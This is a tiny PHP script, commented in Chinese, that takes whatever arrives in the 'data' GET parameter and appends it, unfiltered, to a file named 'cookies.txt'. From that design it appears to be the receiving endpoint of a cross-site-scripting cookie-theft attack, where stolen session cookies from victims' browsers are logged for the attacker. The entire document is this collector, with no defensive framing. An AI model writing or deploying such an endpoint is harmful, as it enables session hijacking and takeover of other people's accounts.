<?php
// 获取GET请求中的data参数
$data = $_GET['data'];

// 将获取到的数据写入日志文件
file_put_contents('cookies.txt', $data . "\n", FILE_APPEND);
?>
